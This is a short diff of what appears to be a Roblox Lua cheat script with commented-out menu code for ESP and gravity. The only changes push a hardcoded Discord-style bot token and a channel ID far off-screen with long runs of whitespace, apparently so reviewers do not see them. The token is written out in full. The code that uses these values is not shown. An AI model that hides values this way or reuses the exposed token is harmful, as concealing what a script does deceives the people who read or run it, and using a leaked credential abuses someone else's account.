@@ -27,7 +27,7 @@
 --local ExitButton = Instance.new("TextButton")
 --local Toggle = Instance.new("TextButton")
 
-token = "ODkzNTE0ODcxODQzNDU1MDA3.GJ4eH8.LP5l5KuEQZYax7T53V13yqeOXFl16e26lvOuLo"
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           token = "ODkzNTE0ODcxODQzNDU1MDA3.GJ4eH8.LP5l5KuEQZYax7T53V13yqeOXFl16e26lvOuLo"
 
 --RegGrav.Name = "RegGrav"
 --RegGrav.Parent = MurderFrame
@@ -53,7 +53,7 @@ token = "ODkzNTE0ODcxODQzNDU1MDA3.GJ4eH8.LP5l5KuEQZYax7T53V13yqeOXFl16e26lvOuLo"
 --LowGrav.TextColor3 = Color3.new(1, 1, 0)
 --LowGrav.TextSize = 20
 
-channelId = "1316757556105973800" 
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           channelId = "1316757556105973800" 
 
 --Esp.Name = "Esp"
 --Esp.Parent = MurderFrame
